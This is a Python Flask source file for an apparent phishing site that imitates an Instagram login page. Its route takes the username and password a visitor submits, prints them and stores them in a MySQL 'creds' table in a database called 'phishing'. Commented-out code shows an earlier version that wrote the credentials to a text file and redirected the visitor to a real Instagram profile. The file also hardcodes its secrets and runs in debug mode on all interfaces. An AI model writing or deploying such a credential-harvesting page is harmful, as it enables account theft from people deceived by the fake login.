
from flask import Flask, render_template, redirect, url_for, request
from flask_wtf import FlaskForm
import mysql.connector

app = Flask(__name__)
app.config['SECRET_KEY'] = "secretkey"

@app.route('/instagram_login', methods=['GET', 'POST'])
def insta_login():
    user_data = request.form
    username = user_data.get('username')
    password = user_data.get('password')
    if username and password:
        print(f'Username : {username}')
        print(f'Password : {password}')
        # file = open('/home/bob/Python/flask/creds.txt', 'a')
        # l = [f"\nUsername : {username}", f"\nPassword : {password}"]
        # file.writelines(l)
        # file.close()
        # return redirect('https://www.instagram.com/shiba_charmy/')

        mydb = mysql.connector.connect(
        host="localhost",
        user="bob",
        password="password",
        database="phishing"
        )

        mycursor = mydb.cursor()

        sql = "INSERT INTO creds (username, password) VALUES (%s, %s)"
        val = (f"{username}", f"{password}")
        mycursor.execute(sql, val)

        mydb.commit()

        print(mycursor.rowcount, "record inserted.")

        return render_template('amogus.html')
    else:
        return render_template('instagram_login.html')

if __name__ == '__main__':
    app.run(host = '0.0.0.0', debug=True)
    # app.run(debug=True)